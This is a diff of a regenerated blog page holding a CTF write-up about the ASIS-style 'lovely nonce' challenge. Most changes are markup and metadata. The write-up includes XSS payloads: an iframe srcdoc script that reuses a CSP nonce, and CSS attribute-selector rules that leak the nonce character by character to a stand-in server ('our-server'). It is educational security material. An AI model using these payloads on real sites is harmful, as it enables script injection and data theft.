@@ -66,7 +66,7 @@ Recon The CSP is implemented via a meta-tag in the DOM, and not through response
 
 
 
-    <meta property="article:published_time" content="2021-10-24 13:49:21 -0700 PDT" />
+    <meta property="article:published_time" content="2021-10-24 13:49:21 -0700 -0700" />
 
 
 
@@ -175,40 +175,40 @@ if (!doNotTrack) {
 <p>CSS attribute selectors for a stylesheet leak of the CSP nonce combined with XSS.</p>
 <h2 id="recon">Recon</h2>
 <p>The CSP is implemented via a meta-tag in the DOM, and not through response header as is usually the common practise. It&rsquo;s just one directive, <code>script-src</code>, with the randomly generated nonce value, which we can try to retrieve.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Security-Policy&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;script-src &#39;nonce-$NONCE$&#39;&#34;</span>&gt;
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Security-Policy&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;script-src &#39;nonce-$NONCE$&#39;&#34;</span>&gt;
+</span></span></code></pre></div>
     <img src="https://jamvie.net/images/ASISnonceCSP.png"  alt="CSP"  class="center"  style="border-radius: 8px;"  />
 
 
 <p>(Note: it is also possible to extract this nonce from the <code>script</code> tag on the same page)</p>
 <p>The cookie is set to the localhost domain - which is important moving forward with our exploit (we won&rsquo;t be injecting our payloads on the lovelynonce domain, it&rsquo;ll be on localhost).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">setCookie</span>({
-			<span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;flag&#39;</span>,
-			<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;flag{fake-flag}&#34;</span>,
-			<span style="color:#a6e22e">domain</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;localhost&#34;</span>,
-			<span style="color:#a6e22e">expires</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">now</span>() <span style="color:#f92672">+</span> <span style="color:#ae81ff">1000</span>
-		})
-</code></pre></div><p>On the HTML of the page is a location.hash navigator that sets an element in the HTML to the value of whatever <code>document.location.hash</code> was.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">nonce</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;$NONCE$&#34;</span>&gt;
-    	document.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
-    	window.<span style="color:#a6e22e">onhashchange</span> <span style="color:#f92672">=</span> ()=&gt;{
-    		<span style="color:#66d9ef">if</span>(document.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>) {
-          		<span style="color:#a6e22e">desc</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> decodeURIComponent(document.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">1</span>));
-				document.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
-        	}
-    	};
-    &lt;/<span style="color:#f92672">script</span>&gt;
-</code></pre></div><p>Test this out by appending <code>#%3Cp%3Etest%3C%2Fp%3E</code> (just the URLencoded version of <code>#&lt;p&gt;test&lt;/p&gt;</code>) to the challenge webpage and see how this code snippet works. This is an easy XSS vector, but obviously the CSP isn&rsquo;t letting us do something so trivial as <code>#&lt;script&gt;alert(1337)&lt;/script&gt;</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">setCookie</span>({
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;flag&#39;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;flag{fake-flag}&#34;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">domain</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;localhost&#34;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">expires</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">now</span>() <span style="color:#f92672">+</span> <span style="color:#ae81ff">1000</span>
+</span></span><span style="display:flex;"><span>		})
+</span></span></code></pre></div><p>On the HTML of the page is a location.hash navigator that sets an element in the HTML to the value of whatever <code>document.location.hash</code> was.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">nonce</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;$NONCE$&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    	document.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    	window.<span style="color:#a6e22e">onhashchange</span> <span style="color:#f92672">=</span> ()=&gt;{
+</span></span><span style="display:flex;"><span>    		<span style="color:#66d9ef">if</span>(document.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>) {
+</span></span><span style="display:flex;"><span>          		<span style="color:#a6e22e">desc</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> decodeURIComponent(document.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span>				document.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>        	}
+</span></span><span style="display:flex;"><span>    	};
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>Test this out by appending <code>#%3Cp%3Etest%3C%2Fp%3E</code> (just the URLencoded version of <code>#&lt;p&gt;test&lt;/p&gt;</code>) to the challenge webpage and see how this code snippet works. This is an easy XSS vector, but obviously the CSP isn&rsquo;t letting us do something so trivial as <code>#&lt;script&gt;alert(1337)&lt;/script&gt;</code>.</p>
 <p>There&rsquo;s a report function that actually utilizes this browser-side JS to add a report form in the webpage.</p>
 <h2 id="exploit-in-detail">Exploit in Detail</h2>
 <p>The location hash is a potential XSS vector. You can copy-paste the webpage&rsquo;s nonce value into an iframe with the srcdoc attribute and achieve XSS.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;script nonce=[THEIR_NONCE]&gt;alert(1)&lt;/script&gt;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
-</code></pre></div><p>This works because iframes loaded with <code>srcdoc</code> aren&rsquo;t cross-origin. BUT, this also won&rsquo;t work for the challenge as the server generates unique nonces for each request, meaning that our nonce won&rsquo;t be the same nonce that the admin has when they load up our webpage with our iframe payload. The CSP is technically doing it&rsquo;s job, and even with the copy-pasted nonce and srcdoc iframe, this is just a self-XSS for now. Ideally, we want to find out the nonce of the webpage when the admin visits - and while they&rsquo;re still on the webpage, load up our iframe payload with the correct nonce.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;script nonce=[THEIR_NONCE]&gt;alert(1)&lt;/script&gt;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span></code></pre></div><p>This works because iframes loaded with <code>srcdoc</code> aren&rsquo;t cross-origin. BUT, this also won&rsquo;t work for the challenge as the server generates unique nonces for each request, meaning that our nonce won&rsquo;t be the same nonce that the admin has when they load up our webpage with our iframe payload. The CSP is technically doing it&rsquo;s job, and even with the copy-pasted nonce and srcdoc iframe, this is just a self-XSS for now. Ideally, we want to find out the nonce of the webpage when the admin visits - and while they&rsquo;re still on the webpage, load up our iframe payload with the correct nonce.</p>
 <p>Nonces implemented via the meta-tag, or nonces within the script-tag can be leaked through CSS attribute selectors. Setting the hash to:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">*</span>{<span style="color:#66d9ef">display</span>:<span style="color:#66d9ef">block</span>}<span style="color:#f92672">meta</span><span style="color:#f92672">[</span><span style="color:#f92672">content</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;script-src nonce-a&#34;</span><span style="color:#f92672">]</span>{<span style="color:#66d9ef">background-image</span>:url(<span style="color:#e6db74">&#34;http://our-server/result?nonce=a&#34;</span>);}&lt;/<span style="color:#f92672">style</span>&gt;
-</code></pre></div><p>or</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">script</span><span style="color:#f92672">[</span><span style="color:#f92672">nonce</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">]</span>{<span style="color:#66d9ef">display</span>:<span style="color:#66d9ef">block</span>;<span style="color:#66d9ef">background</span>:url(<span style="color:#e6db74">&#34;http://our-server/result?nonce=a&#34;</span>);}&lt;/<span style="color:#f92672">style</span>&gt;
-</code></pre></div><p>will send a request to our server in the event that any element with the right attribute stuck to it has a value starting with <code>script-src nonce-a</code>. We can extrapolate this further to brute-force each character in the attribute value and use fetches to our server to extract the correct &lsquo;next character&rsquo; of the nonce.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">*</span>{<span style="color:#66d9ef">display</span>:<span style="color:#66d9ef">block</span>}<span style="color:#f92672">meta</span><span style="color:#f92672">[</span><span style="color:#f92672">content</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;script-src nonce-a&#34;</span><span style="color:#f92672">]</span>{<span style="color:#66d9ef">background-image</span>:url(<span style="color:#e6db74">&#34;http://our-server/result?nonce=a&#34;</span>);}&lt;/<span style="color:#f92672">style</span>&gt;
+</span></span></code></pre></div><p>or</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">script</span><span style="color:#f92672">[</span><span style="color:#f92672">nonce</span><span style="color:#f92672">^=</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">]</span>{<span style="color:#66d9ef">display</span>:<span style="color:#66d9ef">block</span>;<span style="color:#66d9ef">background</span>:url(<span style="color:#e6db74">&#34;http://our-server/result?nonce=a&#34;</span>);}&lt;/<span style="color:#f92672">style</span>&gt;
+</span></span></code></pre></div><p>will send a request to our server in the event that any element with the right attribute stuck to it has a value starting with <code>script-src nonce-a</code>. We can extrapolate this further to brute-force each character in the attribute value and use fetches to our server to extract the correct &rsquo;next character&rsquo; of the nonce.</p>
 <p>If the CSS attribute selector successfully finds a tag that matches the above conditions, then a request is fired to our server. Otherwise, no request is made to our server.</p>
 <p>To change the hash, we have the admin open a window to the vulnerable page (localhost:8000), identified by a name (
 <code>open(&quot;http://localhost:8000/&quot;, &quot;thisOneWindow&quot;)</code>), and after that, we can have the admin open a window with the same url, but with a different hash, and the same name (
@@ -269,7 +269,7 @@ if (!doNotTrack) {
 
             <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>785 Words</p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2021-10-24 13:49 -0700</p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2021-10-24 14:49 -0600</p>
         </div>
 
         
@@ -282,16 +282,16 @@ if (!doNotTrack) {
                 <div class="pagination__buttons">
                     
                         <span class="button previous">
-                            <a href="https://jamvie.net/posts/2022/04/b01lers-ctf-2022-hacker/place/">
+                            <a href="https://jamvie.net/posts/2021/12/2021-wrapped/">
                                 <span class="button__icon">←</span>
-                                <span class="button__text">b01lers CTF 2022: hacker/place</span>
+                                <span class="button__text">2021: Wrapped</span>
                             </a>
                         </span>
                     
 
                     
                         <span class="button next">
-                            <a href="https://jamvie.net/posts/2021/08/rarctf-2021-maas-2-unintended-solutions/">
+                            <a href="https://jamvie.net/posts/2021/08/rarctf-2021-maas-2--unintended-solutions/">
                                 <span class="button__text">RaRCTF 2021: MAAS 2 &#43; Unintended Solutions</span>
                                 <span class="button__icon">→</span>
                             </a>
@@ -332,7 +332,7 @@ if (!doNotTrack) {
 
 
 
-<script type="text/javascript" src="https://jamvie.net/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>
+<script type="text/javascript" src="https://jamvie.net/bundle.min.af5a3e743efae0c74305dc03080fb4bd5ae8f1a60160b3599ab59639ad6c182d763fb4238e72a726f48319ad132a4cdc9cd51fac5462e8a25dc0ba096f547038.js" integrity="sha512-r1o&#43;dD764MdDBdwDCA&#43;0vVro8aYBYLNZmrWWOa1sGC12P7QjjnKnJvSDGa0TKkzcnNUfrFRi6KJdwLoJb1RwOA=="></script>
     
 <script type="application/javascript">
 var doNotTrack = false;
